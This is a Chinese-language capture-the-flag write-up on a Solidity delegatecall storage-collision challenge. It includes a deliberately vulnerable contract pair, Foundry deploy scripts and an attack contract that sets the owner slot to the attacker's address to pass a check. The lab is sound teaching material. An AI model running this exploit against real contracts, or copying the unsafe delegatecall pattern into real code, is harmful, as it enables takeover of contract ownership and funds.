# Deledatecall

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "../lib/forge-std/src/Script.sol";

contract Wang {
    string public name; //0
    uint256 public age; //1
    uint256 public time; //2

    function SetAge(uint256 _age) public {
        age = _age;
    }
}

//0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
contract Liu {
    address public wangAddress; //0
    address public owner; //1
    string public name; //2
    uint256 public age; //3

    uint256 public time; //4

    constructor(address addr) {
        wangAddress = addr;
    }

    function _setAgeWang(uint256 _age) internal returns (bool) {
        (bool success, bytes memory data) = wangAddress.delegatecall(
            abi.encodeWithSignature("SetAge(uint256)", _age)
        );
        require(success, "no ");
        return true;
    }

    function setAgeWang(uint256 _age) external {
        _setAgeWang(_age);
    }

    //solve
    function check() external view returns (bool) {
        require(owner == msg.sender, "no");
        return true;
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import "../src/1.sol";

contract liuwangSC is Script {
    function run() external {
        vm.startBroadcast();
        Wang wang = new Wang();
        Liu liu = new Liu(address(wang));

        console.log("wang", address(wang));
        console.log("liu", address(liu));
        vm.stopBroadcast();
    }
}

```

## 攻击思路

利用delegatecall的存储冲突,合约Liu`delegatecall`合约Wang的`SetAge()`函数,把\_age赋值给age,合约Wang中age在1槽,那么找合约Liu的11槽是owner,所以**最终效果是把\_age赋值给owner**

**owner**正是解题关键,让`_age`为`msg.sender`即可,这样owner == msg.sender就能通关

* 怎么找到msg.sender??

写一个攻击合约,`address(this)`就好了^\_^

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Liu} from "./1.sol";//只导入Liu即可

contract Attack {
    Liu public liu;

    constructor(address addr) {
        liu = Liu(addr);
    }

    function attack() external {
        liu.setAgeWang(uint256(uint160(address(this))));
        liu.check();
        require(liu.check() == true, "no");
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    Attack public attack;//这里定义过了,下面new的时候就不用再加开头的Attack

    function run() external {
        vm.startBroadcast();
        attack = new Attack(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
        attack.attack();
        vm.stopBroadcast();
    }
}
```

* address转换为uint256:uint256(uint160(address(this)))


> 更新: 2025-07-14 09:45:15  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/czgozp2khz7ng7tt>